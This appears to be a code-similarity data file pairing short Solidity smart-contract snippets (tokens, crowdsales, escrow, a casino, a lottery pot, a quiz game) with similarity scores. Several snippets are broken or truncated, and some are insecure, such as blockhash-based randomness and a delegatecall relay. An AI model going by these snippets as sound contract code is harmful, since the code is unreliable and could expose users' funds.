        if (msg.sender != minter) return;
        balances[receiver] += amount;
    }
    function send(address receiver, uint amount) {
        if (balances[msg.sender] < amount) return;
        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        Sent(msg.sender, receiver, amount);
    }
}",0.6502258602817793,"contract BasicToken is ERC20Basic {
  using SafeMath for uint;

  mapping(address => uint) balances;

  function transfer(address _to, uint _value) public returns (bool) {
    require(_to != address(0));
    require(_value > 0 && _value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;
  }

  function balanceOf(address _owner) public constant returns (uint balance) {
    return balances[_owner];
  }
}"
"contract Sender {
    function() payable {
    }

    function sendTo(address receiverAddr) {
        var receiver = Receiver(receiverAddr);
        receiver.transfer(this.balance); 
    }
}",0.6150789239552035,"contract Token {

    function transfer(address receiver, uint amount) public;

    function balanceOf(address receiver)public returns(uint);

}"
"contract Example {
        string s=""Hello World!"";
        function set_s(string new_s) {
            s = new_s;
        }
        function get_s() returns (string) {
            return s;
        }
    }",0.6378853139916509,"contract MyContract {
  string word = ""All men are created equal!"";

  function getWord() returns (string){
    return word;
  }

}"
"contract SMPCrowdsale {

    using SafeMath for uint;

    
    address public beneficiary;                     
    address public creator;                         
    address public confirmedBy;                     
    uint256 public minAmount = 2000 ether;          
    uint256 public maxSupply = 90000000 * 10**8;    
    uint256 public minAcceptedAmount = 10 finney;   

    
    uint256 public lastWeekEnd = 51 days;

    
    uint256 public rateICO = 1500 * 10**8;

    enum Stages {
        InProgress,
        Ended,
        Withdrawn
    }

    Stages public stage = Stages.InProgress;

    
    uint256 public start;
    uint256 public end;
    uint256 public raised;

    
    Token public smpToken;

    
    mapping (address => uint256) balances;

    
    modifier atStage(Stages _stage) {
        require(stage == _stage);
        _;
    }

    
    modifier onlyBeneficiary() {
        require(beneficiary == msg.sender);
        _;
    }

    
    function balanceOf(address _investor) constant returns (uint256 balance) {
        return balances[_investor];
    }

    
    function SMPCrowdsale(address _tokenAddress, address _beneficiary, address _creator, uint256 _start) {
        smpToken = Token(_tokenAddress);
        beneficiary = _beneficiary;
        creator = _creator;
        start = _start;
        end = start + lastWeekEnd;
    }

    
    function confirmBeneficiary() onlyBeneficiary {
        confirmedBy = msg.sender;
    }

    
    function endCrowdsale() atStage(Stages.InProgress) {

        
        require (now >= end);

        stage = Stages.Ended;
    }

    
    function withdraw() onlyBeneficiary atStage(Stages.Ended) {

        
        require(raised >= minAmount);

        uint256 ethBalance = this.balance;

        beneficiary.transfer(ethBalance);

        stage = Stages.Withdrawn;
    }

    
    function refund() atStage(Stages.Ended) {

        
        assert(raised < minAmount);

        address investor = msg.sender;

        uint256 receivedAmount = balances[investor];
        balances[investor] = 0;
        require(receivedAmount > 0);
        investor.transfer(receivedAmount);        
    }

    
    function () payable atStage(Stages.InProgress) {
        
        require(now >= start);

        
        require(now <= end);

        address investor = msg.sender;
        uint256 received = msg.value; 

        
        require(received >= minAcceptedAmount);
        uint256 tokens = received * rateICO;

        require(tokens > 0);

        require(smpToken.issue(investor, tokens));

        balances[investor] = balances[investor].add(received);
        raised += received;

        
        if (smpToken.totalSupply() >= maxSupply) {
            stage = Stages.Ended;
        }
    }
}",0.6630233429650524,"contract Bugis_Crowdsale is Pausable {
  using SafeMath for uint256;

  
  ERC20 public token;

  
  address public wallet;

  
  uint256 public rate;

  
  uint256 public weiRaised;
  
  
  uint256 public cap;
  
  
  uint256 public minInvest;
  
  
  uint256 public openingTime;
  
  
  uint256 public closingTime;

  
  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);

  function Bugis_Crowdsale() public {
    rate = 1000;
    wallet = owner;
    token = ERC20(0x1cd74dD56b0929f1505c6e1f9Bdf57fb31D60631);
    cap = 300 * 1 ether;
    minInvest = 0.1 * 1 ether;
    openingTime = 0;    
    closingTime = 0;    
  }

  
  
  

  
  function () external payable {
    buyTokens(msg.sender);
  }

  
  function buyTokens(address _beneficiary) public payable {

    uint256 weiAmount = msg.value;
    _preValidatePurchase(_beneficiary, weiAmount);

    
    uint256 tokens = _getTokenAmount(weiAmount);

    
    weiRaised = weiRaised.add(weiAmount);

    _processPurchase(_beneficiary, tokens);
    emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);

    _forwardFunds();
  }

  
  
  

  
  function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal whenNotPaused {
    require(_beneficiary != address(0));
    require(_weiAmount >= minInvest);
    require(weiRaised.add(_weiAmount) <= cap);
    require(now >= openingTime && now <= closingTime);
  }

  
  function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {
    token.transfer(_beneficiary, _tokenAmount);
  }

  
  function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {
    _deliverTokens(_beneficiary, _tokenAmount);
  }

  
  function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {
    return _weiAmount.mul(rate);
  }

  
  function _forwardFunds() internal {
    wallet.transfer(msg.value);
  }
  
  
  function start() public onlyOwner {
    openingTime = now;            
    closingTime =  now + 16 days;
  }
  
  
  function capReached() public view returns (bool) {
    return weiRaised >= cap;
  }
  
  
  function hasClosed() public view returns (bool) {
    return now > closingTime;
  }

  
  function withdrawTokens() public onlyOwner {
    uint256 unsold = token.balanceOf(this);
    token.transfer(owner, unsold);
  }
    
}"
"contract Forwarder {

    address public destinationAddress;
    address constant public otherAddress = 0xf17f52151EbEF6C7334FAD080c5704D77216b732;

    event LogForwarded(address indexed sender, uint amount);
    event LogFlushed(address indexed sender, uint amount);

    function Forwarder() public {
        destinationAddress = msg.sender;
    }

    function() payable public {
        emit LogForwarded(msg.sender, msg.value);
        otherAddress.transfer(msg.value /3);        
        destinationAddress.transfer(msg.value /3);  
    }

    function flush() public {
        emit LogFlushed(msg.sender, address(this).balance);
        destinationAddress.transfer(address(this).balance);
    }

}",0.6388104515269958,"contract Depay {

    address public developer;
    uint public donations;

    function Depay() public {
        developer = msg.sender;
    }

    event Payment(address indexed sender, address indexed receiver, uint indexed amount, uint donation);
    function pay(address recipient, uint donation) public payable {
        require(donation < msg.value);
        recipient.transfer(msg.value - donation);
        donations += donation;
        Payment(msg.sender, recipient, msg.value - donation, donation);
    }

    function withdrawDonations(address recipient) public {
        require(msg.sender == developer);
        recipient.transfer(donations);
        donations = 0;
    }
}"
"contract timeLock2 {
      mapping(address => uint256) _balances;
      event Transfer(address, uint256);

      newERC20Interface token;
      address receiver = 0xAdB2cbbAb6764643ec15789F8428d5cD9510342b;
      uint256 amountToSend = 100;
      uint256 relaseTime = 1589180400;

      function releseToken() public {
          require(msg.sender == receiver);
          require(now >= relaseTime);

          msg.sender.transfer(amountToSend);
          emit Transfer(msg.sender, amountToSend);

      }
      function balanceOf(address account) public view returns(uint256){
         return _balances[account];
      }
  }",0.6651580854137396,"contract BasicToken is ERC20Basic {

  using SafeMath for uint256;



  mapping(address => uint256) balances;



  

  function transfer(address _to, uint256 _value) public returns (bool) {

    require(_value > 0);

    require(_to != address(0));

    require(_value <= balances[msg.sender]);



    balances[msg.sender] = balances[msg.sender].sub(_value);

    balances[_to] = balances[_to].add(_value);

    emit Transfer(msg.sender, _to, _value);

    return true;

  }



  

  function balanceOf(address _owner) public view returns (uint256 balance) {

    return balances[_owner];

  }



}"
"contract ApprovalContract {

    address public sender;
    address public receiver;
    address public constant approver = ;

    function deposit(address_receiver) external payable {
        require(msg.value > 0);
        sender = msg.sender;
        receiver = _receiver;
        }

    function viewApprover() external pure returns(address) {
        return(approver);
        }

    function approve() external {
        require(msg.sender == approver);
        receiver.transfer(address(this).balance);
        }
}",0.6665838450074465,"contract Owned {
    address public owner;
    address receiver;

    function Owned() public {
      owner = msg.sender;
      receiver = owner;
    }

    modifier onlyOwner {
      require(msg.sender == owner);
      _;
    }

    function transferOwnership(address newOwner) onlyOwner public {
      require(newOwner != address(0));
      owner = newOwner;
    }

    function changeReceiver(address newReceiver) onlyOwner public {
      require(newReceiver != address(0));
      receiver =  newReceiver;
    }
}"
"contract Relay {
    address public currentVersion;
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function Relay(address initAddr) {
        currentVersion = initAddr;
        owner = msg.sender; 
    }

    function changeContract(address newVersion) public onlyOwner(){
        currentVersion = newVersion;
    }

    function() {
        require(currentVersion.delegatecall(msg.data));
    }
}",0.6998619308627075,"contract Ownable {



    address public owner;



    function Ownable() public {

        owner = msg.sender;

    }



    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    function isOwner(address _address) public constant returns (bool) {

        return _address == owner;

    }



    function transferOwnership(address newOwner) external onlyOwner {

        require(newOwner != address(0));

        owner = newOwner;

    }



}"
"contract Node {

uint public fee;
address public owner;
address[] activeRelays;

  function Node() {
    owner = msg.sender;
    fee = 10;
  }

  function createRelay () returns (address) {
    address relay = new Relay();
    activeRelays.push(relay);
    return relay;
  }
}",0.6621461052786317,"contract OzrealTest is Notify
{
    address public ozr;
    
    function setOzr(address _addr) { ozr = _addr; }
    
    function notify(address _from, uint _amount) public returns (bool)
    {
        require(msg.sender == ozr);
        Notified(_from, _amount);
        return true;
    }
}"
"contract Test {
    string[] public myArray;

    function Test() public {
        myArray.push(""hola"");
    }

    function getArray() public view returns (string[]) {
        return myArray;
    }
}",0.6860565479621517,"contract MyTest{
    string private name;
   
    function setName(string newName) public{
        name=newName;
    }
    
    function getName() public view returns(string){
        return name;
    }
    
}"
"contract ClientReceipt {
    event Deposit(
        address indexed _from,
        bytes32 indexed _id,
        uint _value
    );

    function deposit(bytes32 _id) {
        
        
        
        Deposit(msg.sender, _id, msg.value);
    }
}",0.653312288838322,"contract DMIBLog {

    event MIBLog(bytes4 indexed sig, address indexed sender, uint _value) anonymous;



    modifier mlog {

        emit MIBLog(msg.sig, msg.sender, msg.value);

        _;

    }

}"
"contract Buyer is Purchase {
    address public buyerAddress;
    string pass;
    bytes32 hashpass;

    modifier onlyBuyer() {
        require(msg.sender == buyerAddress);
        _;
    }

    constructor(string _pass) {
        buyerAddress = msg.sender;
        pass = _pass;
    }

    function stringToBytes32(string pass) returns (bytes32 hashpass) {
        hashpass = bytes32(pass);
    }

    function generateHashPass() public {

    }
}",0.6104739106801468,"contract EthAvatar {
    mapping (address => string) private ipfsHashes;

    event DidSetIPFSHash(address indexed hashAddress, string hash);


    function setIPFSHash(string hash) public {
        ipfsHashes[msg.sender] = hash;

        DidSetIPFSHash(msg.sender, hash);
    }

    function getIPFSHash(address hashAddress) public view returns (string) {
        return ipfsHashes[hashAddress];
    }
}"
"contract test {
    event test_value(uint256 indexed value1);
    uint256 value_test;

     function test_f() public {

        
        emit test_value(value_test); 
    }
}",0.6628509578843926,"contract Burnable {

  function burn(uint256 value) public returns (bool);

  event Burn(address indexed from, uint256 value);

}"
"contract A {
    function verifyUser(address userAddress) public returns(bool) {
        bool verified = false;
        uint id = userId[userAddress];
        if (id != 0) {
            verified = true;
        }
        return verified;
    }
}",0.6356248441754255,"contract ERC20 {
    function transfer(address dst, uint wad) public returns (bool);
    function transferFrom(address src, address dst, uint wad) public returns (bool);
}"
"contract B {

  function funcB(uint256 arg1, uint256 arg2) public pure returns(bool) {
    if (arg1 > 10 && arg2 > 90) {
        return true;
    } else {
        return false;
    }
  }
}",0.652381059397537,"contract Ownable {

    address public Owner = msg.sender;

    function isOwner() public returns (bool) {

        if (Owner == msg.sender) {

            return true; 

        }

        return false;

    }

}"
"contract  {

  mapping(address => uint) public answers;
  string question;
  address asker;
  uint trues;
  uint falses;

  
  function Questions(string _question) public {
    asker = msg.sender;
    question = _question;
  }

  function answerQuestion (bool _answer) public {
    if (answers[msg.sender] == 0 && _answer) { 
      answers[msg.sender] = 1; 
      trues += 1;
    }
    else if (answers[msg.sender] == 0 && !_answer) {
      answers[msg.sender] = 2; 
      falses += 1;
    }
    else if (answers[msg.sender] == 2 && _answer) { 
      answers[msg.sender] = 1; 
      trues += 1;
      falses -= 1;
    }
    else if (answers[msg.sender] == 1 && !_answer) { 
      answers[msg.sender] = 2; 
      trues -= 1;
      falses += 1;
    }
  }

  function getQuestion() public constant returns (string, uint, uint, uint) {
    return (question, trues, falses, answers[msg.sender]);
  }

}",0.603623023739334,"contract Jeopardy
{
    bytes32 responseHash;
    string public Question;
    address questionSender;

    function Try(string answer)
    public payable {
        if (responseHash == keccak256(answer) && msg.value > 1 ether) {
            msg.sender.transfer(address(this).balance);
        }
    }
 
    function startGame(string question, string response)
    public payable {
        if (responseHash == 0x0) {
            responseHash = keccak256(response);
            Question = question;
            questionSender = msg.sender;
        }
    }

    function endGame()
    public payable {
        if (msg.sender == questionSender) {
            msg.sender.transfer(address(this).balance);
        }
    }

    function newGame(string question, bytes32 _responseHash)
    public payable {
        if (msg.sender == questionSender) {
            Question = question;
            responseHash = _responseHash;
        }
    }
    
    function () payable public {}
}"
"contract Escrow {
  address public buyer;
  address public seller;
  address public arbiter;

  function Escrow(address _seller, address _arbiter) public payable { 
    buyer = msg.sender;
    seller = _seller;
    arbiter = _arbiter;
  }

  function payoutToSeller() public {
    if (msg.sender == arbiter || msg.sender == buyer) {
      seller.send(this.balance); 
    }
  }

  function refundBuyer() public {
    if (msg.sender == arbiter || msg.sender == seller) {
      buyer.send(this.balance);
    }
  }

  function getBalance() constant returns (uint) {
    return this.balance;
  }
}",0.6789532233555591,"contract ArbitrageCoin {
    
    
    address public minter;
    mapping (address => uint) public balances;

    
    
    event Sent(address from, address to, uint amount);

    
    
    function Coin() public {
        minter = msg.sender;
    }

    function mint(address receiver, uint amount) public {
        if (msg.sender != minter) return;
        balances[receiver] += amount;
    }

    function send(address receiver, uint amount) public {
        if (balances[msg.sender] < amount) return;
        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        Sent(msg.sender, receiver, amount);
    }
}"
"contract TEST {

  string Test;

  mapping (uint => string) public test;
  uint totalTests;

  function totalTestsCount() view public returns (uint) {
    return totalTests;
  }

  function createTest(string test_data) public returns (uint) {

    uint test_id = totalTests++;

    test[test_id] = test_data;

    return test_id;
  } 

  function showTest(uint test_id) view public returns (string){

    string memory t_test = test[test_id];

    return (t_test);
  } 

}",0.6364762835841686,"contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    
    constructor () public {
        _name = ""Sable Coin"";
        _symbol = ""SAC1"";
        _decimals = 18;
    }

    
    function name() public view returns (string memory) {
        return _name;
    }

    
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}"
"contract DieselPrice is usingOraclize {
    function DieselPrice(){

        event one(string description);
        event newDieselPrice(string price);
    }
    function DieselPrice() {
        update(); 
    }

    function __callback(bytes32 myid, string result) {
        if (msg.sender != oraclize_cbAddress()) throw;
        newDieselPrice(result);
        DieselPriceUSD = parseInt(result, 2); 
        
    }

    function update() payable {
        one(""Oraclize query was sent, standing by for the answer.."");
        oraclize_query(""URL"", ""xml(https:
    }

}",0.6007079260606552,"contract I_Pricer {
    uint128 public lastPrice;
    I_minter public mint;
    string public sURL;
    mapping (bytes32 => uint) RevTransaction;

    function setMinter(address _newAddress) {}
    function __callback(bytes32 myid, string result) {}
    function queryCost() constant returns (uint128 _value) {}
    function QuickPrice() payable {}
    function requestPrice(uint _actionID) payable returns (uint _TrasID) {}
    function collectFee() returns(bool) {}
    function () {
        
        revert();
    }
}"
"contract HelloWorld {
    uint public balance;

    function sayHi() returns (bool success) {
        balance = 1000;
        return true;
    }
}",0.6989257369198767,"contract DAppTest {

  bool public _is;

  function changeBoolean() public returns (bool success) {
    _is = !_is;
    return true;
  }

}"
"contract token { 
    mapping (address => uint) public coinBalanceOf;
    event CoinTransfer(address sender, address receiver, uint amount);

    
   function token(uint supply) {
     coinBalanceOf[msg.sender] = supply;
   }

   
   function sendCoin(address receiver, uint amount) returns(bool sufficient) {
     if (coinBalanceOf[msg.sender] < amount) return false;
     coinBalanceOf[msg.sender] -= amount;
     coinBalanceOf[receiver] += amount;
     CoinTransfer(msg.sender, receiver, amount);
     return true;
   }
}",0.6397292374990369,"contract BasicToken is ERC20Basic {

    using SafeMath for uint256;

    mapping(address => uint256) balances;

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(msg.sender != address(0));
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balances[_owner];
    }

}"
"contract fisrtCoin {

    address deployer; 
    mapping(address=>uint) balances;  

    public function fisrtcoin() {
        deployer = msg.sender;  
    }



    public function giveCoin(uint amount, address receiver) {
      if(msg.sender == deployer){
          balances[receiver] += amount;
      }
      else {
          throw; 
      }
    }

    public function viewBalance() returns (uint) {
        return balances[msg.sender];
    }
}",0.6520250268134787,"contract Vault is Ownable { 



    function () public payable {



    }



    function getBalance() public view returns (uint) {

        return address(this).balance;

    }



    function withdraw(uint amount) public onlyOwner {

        require(address(this).balance >= amount);

        owner.transfer(amount);

    }



    function withdrawAll() public onlyOwner {

        withdraw(address(this).balance);

    }

}"
"contract MetaCoin {
   mapping (address => uint) balances;
   uint testArraySum;

   event Transfer(address indexed _from, address indexed _to, uint256 _value);

   function MetaCoin() {
       balances[tx.origin] = 10000;

   }

   function initialize(uint[] _test_array) returns(bool){
      for(uint i = 0; i < _test_array.length; i++) {
         testArraySum += _test_array[i];
      }
      return true;
   }

   function sendCoin(address receiver, uint amount) returns(bool sufficient) {
       if (balances[msg.sender] < amount) return false;
       balances[msg.sender] -= amount;
       balances[receiver] += amount;
       Transfer(msg.sender, receiver, amount);
       return true;
   }
   function getBalance(address addr) returns(uint) {
       return balances[addr];
   }
}",0.6936257436273773,"contract ERC20 {

  function totalSupply()public view returns(uint total_Supply);

  function balanceOf(address _owner)public view returns(uint256 balance);

  function allowance(address _owner, address _spender)public view returns(uint remaining);

  function transferFrom(address _from, address _to, uint _amount)public returns(bool ok);

  function approve(address _spender, uint _amount)public returns(bool ok);

  function transfer(address _to, uint _amount)public returns(bool ok);

  event Transfer(address indexed _from, address indexed _to, uint _amount);

  event Approval(address indexed _owner, address indexed _spender, uint _amount);

}"
"contract Birthday {
    function celeb() public {
        emit Party.Pinata(222);
    }
}",0.6000878405456436,"contract PipInterface {
    function read() public returns (bytes32);
}"
"contract User { 
          string public userName;

          function User(string _name) {
                 userName=_name;
          }

   }",0.6771737962733895,"contract Resolver {
    function setName(bytes32 node, string memory name) public;
}"
"contract strtest { bool ib_equal; function test(string p1,string p2) returns(bool) { return true;  }}",0.6468807187920032,"contract Burner {

    function tokenFallback(address , uint , bytes ) returns (bool result) {
        return true;
    }

}"
"contract Factory is Ownable {

    mapping(string => address) services;

    event DidExecuteService(address contractAddress);

    modifier ValidateString(string str) {
        require(bytes(str).length > 0);
        _;
    }

    function Factory() public {}

    function createService(string name) public onlyOwner ValidateString(name) {
        address assetAddress = new Game();
        services[name] = assetAddress;
    }

    function executeService(string name) public onlyOwner {
        address contractAddress = services[name];
        Service(contractAddress).execute();
        emit DidExecuteService(contractAddress);
    }

    function getContract(string name) public view returns (address) { return services[name]; }

    function countContracts() public view returns (uint) { return 0; }

    function getBalance() public view returns (uint) { return address(this).balance; }
}",0.6209484782750188,"contract Token {

  

  function totalSupply() public view returns (uint256 supply);



  function balanceOf(address _owner) public view returns (uint256 balance);



  function transfer(address _to, uint256 _value) public returns (bool success);



  function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);



  function approve(address _spender, uint256 _value) public returns (bool success);



  function allowance(address _owner, address _spender) public view returns (uint256 remaining);



  event Transfer(address indexed _from, address indexed _to, uint256 _value);

  event Approval(address indexed _owner, address indexed _spender, uint256 _value);



  uint public decimals;

  string public name;

}"
"contract Casino is usingOraclize {
   address owner;
   uint public betAmount = 30 finney; 
   uint public totalBet; 
   uint public numberOfBets; 
   
   uint public limitAmountOfBets = 3; 
   uint public numberWinner; 
   address[] public players; 
   mapping(uint => address[]) numberBetPlayers; 
   mapping(address => uint) playerBetsNumber; 

   modifier onEndGame() {
       if(numberOfBets >= limitAmountOfBets) _;
   }

   
   function Casino(uint _betAmount, uint _limitAmountOfBets) {
       owner = msg.sender; 

       if(_betAmount > 0) betAmount = _betAmount;
       if(_limitAmountOfBets > 0) limitAmountOfBets = _limitAmountOfBets;

       oraclize_setProof(proofType_Ledger); 
   }

   
   function checkPlayerExists(address player) public returns(bool) {
       if(playerBetsNumber[player] > 0) return true;
       else return false;
   }

   
   function bet(uint numberToBet) payable {
       require(numberOfBets <= limitAmountOfBets); 
       require(!checkPlayerExists(msg.sender)); 
       require(numberToBet >=1 && numberToBet <= 10); 
       require(msg.value == betAmount); 

       playerBetsNumber[msg.sender] = numberToBet;
       numberBetPlayers[numberToBet].push(msg.sender);

       numberOfBets += 1;
       totalBet += msg.value;

       if(numberOfBets >= limitAmountOfBets) generateNumberWinner();
   }

   
   function generateNumberWinner() payable onEndGame {
       uint numberRandomBytes = 4;
       uint delay = 0;
       uint callbackGas = 200000;

       bytes32 queryId = oraclize_newRandomDSQuery(delay, numberRandomBytes, callbackGas);
   }

   function __calback(bytes32 _queryId, string _result, bytes _proof) oraclize_randomDS_proofVerify(_queryId, _result, _proof) onEndGame {
       assert(msg.sender == oraclize_cbAddress());

       numberWinner = (uint(sha3(_result))%10+1);
       distributePrizes();
   }

   function distributePrizes() onEndGame {
       uint winnerEtherAmount = totalBet / numberBetPlayers[numberWinner].length; 

       for(uint i = 0; i < numberBetPlayers[numberWinner].length; i++) { 
           numberBetPlayers[numberWinner][i].transfer(winnerEtherAmount);
       }

       for(uint j = 1; j <= 10; j++) {
           numberBetPlayers[j].length = 0;
       }

       totalBet = 0;
       numberOfBets = 0;
   }
}",0.6000846505035313,"contract Pot {

	address public owner;
    address[] public potMembers;
    
	uint public potSize = 0;
	uint public winnerIndex;
	address public winnerAddress;
	uint public minBetSize = .01 ether;
	uint public potTime = 1800;
	uint public endTime = now + potTime;
	uint public totalBet = 0;

	bool public locked = false;
	
	event potSizeChanged(
        uint _potSize
    );
	
	event winnerAnnounced(
	    address winner,
	    uint amount
	);
	
	event timeLeft(uint left);
	
	event debug(string msg);
	
	function Pot() {
		owner = msg.sender;
	}

	
	
	
	
	
	
	
	function bytesToString (bytes32 data) returns (string) {
        bytes memory bytesString = new bytes(32);
        for (uint j=0; j<32; j++) {
            byte char = byte(bytes32(uint(data) * 2 ** (8 * j)));
            if (char != 0) {
                bytesString[j] = char;
            }
        }
        return string(bytesString);
    }
	
	
	function joinPot() public payable {
	    
	    assert(now < endTime);
        
	    for(uint i = msg.value; i >= minBetSize; i-= minBetSize) {
	        potMembers.push(msg.sender);
	        totalBet+= minBetSize;
	        potSize += 1;
	    }
	    
	    potSizeChanged(potSize);
	    timeLeft(endTime - now);
	    
	}

	function getPlayers() constant public returns(address[]) {
		return potMembers;
	}
	
	function getEndTime() constant public returns (uint) {
	    return endTime;
	}
	
    function rewardWinner() public payable {
        
        
        debug(""assert now > end time"");
        assert(now > endTime);
        if(!locked) {
            locked = true;
            debug(""locked"");
            if(potSize > 0) {
            	
            	if(potMembers.length == 1) 
            		random_number = 0;
            	else
                	uint random_number = uint(block.blockhash(block.number-1))%potMembers.length - 1;
                winnerIndex = random_number;
                winnerAddress = potMembers[random_number];
                uint amountWon = potSize * minBetSize * 98 / 100;
                
                
                winnerAnnounced(winnerAddress, amountWon);
                potMembers[random_number].transfer(amountWon); 
                owner.transfer(potSize * minBetSize * 2 / 100);
            }
            else {
                winnerAnnounced(0x0000000000000000000000000000000000000000, 0);
            }
            
            potSize = 0;
            endTime = now + potTime;
            timeLeft(endTime - now);
            delete potMembers;
            locked = false;
        }
        
    }

}"
"contract OriginalContract {
    function originalFunction() external returns (bool) {
        return true;
    }
}",0.6657442666490317,"contract OsmLike {
    function poke() external;
    function pass() external view returns (bool);
}"
"contract token { 
  mapping (uint => mapping (address => uint)) coinBalanceOf;
  event CoinTransfer(uint coinType, address sender, address receiver, uint amount);

  
  function token(uint numCoinTypes, uint supply) {
    for (uint k=0; k<numCoinTypes; ++k) {
    coinBalanceOf[k][msg.sender] = supply;
  }
}


function sendCoin(uint coinType, address receiver, uint amount) returns(bool sufficient) {
  if (coinBalanceOf[coinType][msg.sender] < amount) return false;

  coinBalanceOf[coinType][msg.sender] -= amount;
  coinBalanceOf[coinType][receiver] += amount;

  CoinTransfer(coinType, msg.sender, receiver, amount);

  return true;",0.6654116947900113,"contract TokenBase
{
    string public name;
    string public symbol;
    uint8 public decimals;
    
	uint256 internal currentSupply;

	mapping(address => uint) public balanceOf;
	event Transfer(address indexed from, address indexed to, uint256 value);
	
	function totalSupply() constant returns (uint256)
	{
	    return currentSupply;
	}
	
	function transfer(address to, uint amount) returns (bool)
	{
		if (balanceOf[msg.sender] < amount) throw;           
		if (balanceOf[to] + amount < balanceOf[to]) throw;
		
		balanceOf[msg.sender] -= amount;
		balanceOf[to] += amount;
		Transfer(msg.sender, to, amount);
		return true;
	}
}"
"contract GroceryFactory is Ownable {
    using SafeMath for uint256;

    address[] public m_arGroceries;
    address public m_aMaintenanceAddress;
    address public m_aFeesAddress;
    uint256 public m_uPrice;

    constructor(address maintenanceAddress, address feesAddress, uint256 price) public payable{
        m_aMaintenanceAddress = maintenanceAddress;
        m_aFeesAddress = feesAddress;
        m_uPrice = price;
    }

    function getMaintenanceAddress() public onlyOwner view returns(address){
        return m_aMaintenanceAddress;
    }

    function setMaintenanceAddress(address maintenanceAddress)public onlyOwner {
        m_aMaintenanceAddress = maintenanceAddress;
    }

    function getFeesAddress() public onlyOwner view returns(address){
        return m_aFeesAddress;
    }

    function setFeesAddress(address feesAddress)public onlyOwner {
        m_aFeesAddress = feesAddress;
    }

    function setPrice(uint256 price) public onlyOwner {
        m_uPrice = price;
    }

    function getPrice() public view returns(uint256){
        return m_uPrice;
    }

    function getGroceriesCount() public onlyOwner view returns(uint){
        return m_arGroceries.length;
    }

    function getPools() public onlyOwner view returns(address[]){
        return m_arGroceries;
    }

    function () external payable {
        createGrocery();
    }

    function createGrocery() public payable returns(address){
        require(msg.sender != address(0), ""Owner is null"");
        require(msg.value == getPrice(), ""Please send the deployment price"");
        require(m_aMaintenanceAddress != address(0), ""Maintenance address is null"");
        require(m_aFeesAddress != address(0), ""Fees address is null"");

        address owner = msg.sender;

        Grocery groc = new Grocery(owner, m_aMaintenanceAddress);
        m_arGroceries.push(groc);

        transferFees();

        return pool;
    }

    function transferFees() private{
        uint256 balance = address(this).balance;

        if(balance > 0){
            m_aFeesAddress.transfer(balance);
        }
    }
}",0.6327857368122733,"contract BitSTDLogic {
    function name()constant  public returns(string) {}
	function symbol()constant  public returns(string) {}
	function decimals()constant  public returns(uint8) {}
	function totalSupply()constant  public returns(uint256) {}
	function allowance(address add,address _add)constant  public returns(uint256) {}
	function sellPrice()constant  public returns(uint256) {}
	function buyPrice()constant  public returns(uint256) {}
	function frozenAccount(address add)constant  public returns(bool) {}
    function BitSTDLogic(address dataAddress){}
	function migration(address sender,address add) public{}
	function balanceOf(address add)constant  public returns(uint256) {}
	function transfer(address sender,address _to, uint256 _value) public {}
	function transferFrom(address _from,address sender, address _to, uint256 _value) public returns (bool success) {}
	function approve(address _spender,address sender, uint256 _value) public returns (bool success) {}
	function approveAndCall(address _spender,address sender,address _contract, uint256 _value, bytes _extraData)public returns (bool success) {}
	function burn(address sender,uint256 _value) public returns (bool success) {}
	function burnFrom(address _from,address sender, uint256 _value) public returns (bool success) {}
	function mintToken(address target,address _contract, uint256 mintedAmount)  public {}
	function freezeAccount(address target, bool freeze)  public {}
	function buy(address _contract,address sender,uint256 value) payable public {}
	function sell(address _contract,address sender,uint256 amount) public {}
	function Transfer_of_authority(address newOwner) public{}
	function Transfer_of_authority_data(address newOwner) public {}
	function setData(address dataAddress) public {}
}"
"contract Child {
   string public a;
   constructor (string arg) public payable { 
       a = arg;
   }
}",0.6410554385229267,"contract Reclaimable is Ownable {

    
    constructor() public payable {
    }

    
    function() public payable {
    }
}"
"contract Factory {
    constructor () public {}
    function createChild(string arg) public payable {
        address issueContract = (new Child).value(msg.value)(arg);
    }
}",0.650950504724695,"contract PayChannel {

    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function () payable public {
        owner.transfer(msg.value);
    }
}"
"contract Factory {

    bytes32[] Names;
    address[] newContracts;
    uint public count=0;

    function createContract (bytes32 name) {
        address newContract = new Contract(name);
        count=count+1;
        newContracts.push(newContract);
    } 

    function getName  (uint i) constant returns (address sblcAddress){
        Contract con = Contract(newContracts[i]);
      sblcAddress= address(con);
       return sblcAddress;
    }
}",0.6344106514260602,"contract IController is Pausable {

    event SetContractInfo(bytes32 id, address contractAddress, bytes20 gitCommitHash);



    function setContractInfo(bytes32 _id, address _contractAddress, bytes20 _gitCommitHash) external;

    function updateController(bytes32 _id, address _controller) external;

    function getContract(bytes32 _id) public view returns (address);

}"
"contract Contract {

    bytes32 public Name;

    function Contract (bytes32 name) {
        Name = name;
    }
}",0.6589717881940966,"contract GroveAPI {
  function insert(bytes32 indexName, bytes32 id, int value) public;
}"
"contract Adoption {
  address[16] public adopters;
  
  function adopt(uint petId) public returns (uint) {
    
    require(petId >= 0 && petId <= 15);
    
    adopters[petId] = msg.sender;
    
    return petId;
  }
  
  function getAdopters() public view returns (address[16] memory) {
    return adopters;
  }
}",0.6292516976040486,"contract PreviousInterface {



    function ownerOf(uint id) public view returns (address);



    function getCard(uint id) public view returns (uint16, uint16);



    function totalSupply() public view returns (uint);



    function burnCount() public view returns (uint);



}"
"contract Mutex {
 bool locked;


modifier noReentrancy() {
require(!locked);
locked = true;
_;
locked = false;
}

